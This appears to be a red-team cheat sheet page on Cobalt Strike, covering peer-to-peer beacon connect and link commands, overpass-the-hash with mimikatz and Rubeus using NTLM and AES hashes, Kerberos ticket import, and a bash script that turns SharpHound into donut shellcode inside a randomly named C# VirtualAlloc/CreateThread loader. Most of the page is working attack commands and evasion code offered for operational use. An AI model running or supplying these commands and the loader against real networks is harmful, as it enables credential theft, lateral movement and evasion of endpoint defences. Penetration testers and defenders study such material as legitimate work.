# Cobalt Strike

- [https://www.cobaltstrike.com/support](https://www.cobaltstrike.com/support)
- [https://www.cobaltstrike.com/aggressor-script/functions.html](https://www.cobaltstrike.com/aggressor-script/functions.html)
- [https://reconshell.com/list-of-awesome-cobaltstrike-resources/](https://reconshell.com/list-of-awesome-cobaltstrike-resources/)
- [https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)




## P2P Beacons

Beacon TCP and Beacon SMB are Peer-to-Peer beacons which means they're used to chain a connection to an existent beacon. They act like bind shells and waits for the attacker to connect to them.

Connect to a TCP beacon:

```
beacon> connect <IP> <PORT>
```

Connect to an SMB beacon:

```
beacon> link <IP>
```




## Overpass-the-Hash

More opsec PtH than builtin `pth` command:

```
beacon> mimikatz sekurlsa::pth /user:snovvcrash /domain:megacorp.local /ntlm:fc525c9683e8fe067095ba2ddc971889
beacon> steal_token 1337
```

Same with Rubeus (must be in elevated context):

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
beacon> steal_token 1337
```

Use Rubeus with lower privileges:

```
beacon> execute-assembly Rubeus.exe asktgt /user:snovvcrash /domain:megacorp.local /aes256:94b4d075fd15ba856b4b7f6a13f76133f5f5ffc280685518cad6f732302ce9ac /nowrap /opsec

PS > [System.IO.File]::WriteAllBytes("C:\Windows\Tasks\tgt.kirbi", [System.Convert]::FromBase64String("[...TICKET...]"))
Or
$ echo -en "[...TICKET...]" | base64 -d > tgt.kirbi

beacon> run klist
Or
beacon> execute-assembly Rubeus.exe klist

beacon> make_token MEGACORP\snovvcrash dummy_Passw0rd!
beacon> kerberos_ticket_use C:\Windows\Tasks\tgt.kirbi
```




## BloodHound

* [https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146](https://github.com/l4ckyguy/ukn0w/commit/0823f51d01790ef53aa9406f99b6a75dfff7f146)

Grab the latest version of [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe), convert it to a shellcode with donut, insert bytes in a C# skeleton and cross-compile it for use in Windows with [Mono](https://linux.die.net/man/1/mcs) compiler:

{% code title="sweetblood.sh" %}
```bash
RNDNAME=`curl -sL https://github.com/penetrarnya-tm/WeaponizeKali.sh/raw/main/misc/binaries.txt | shuf -n1`
wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -qO /tmp/SharpHound.exe

# --ldapusername snovvcrash --ldappassword Passw0rd!
~/tools/PEzor/deps/donut/donut -a2 -z2 -i /tmp/SharpHound.exe -p '--CollectionMethod All,LoggedOn --NoSaveCache --OutputDirectory C:\Windows\Tasks --ZipFilename sweetbl.zip' -o /tmp/SharpHound.bin

BUF=`xxd -i /tmp/SharpHound.bin | head -n-2 | tail -n+2 | tr -d ' ' | tr -d '\n'`
BUFSIZE=`xxd -i /tmp/SharpHound.bin | tail -n1 | awk '{print $5}' | tr -d ';\n'`

cat << EOF > "/tmp/$RNDNAME.cs"
using System;
using System.Runtime.InteropServices;

namespace Sh4rpH0und
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, ulong dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[$BUFSIZE] { $BUF };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (ulong)buf.Length, 0x1000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
EOF

mcs -platform:x64 -t:winexe "/tmp/$RNDNAME.cs" -out:"$RNDNAME.exe"
file "$RNDNAME.exe"
rm "/tmp/SharpHound.exe" "/tmp/SharpHound.bin" "/tmp/$RNDNAME.cs"
```
{% endcode %}
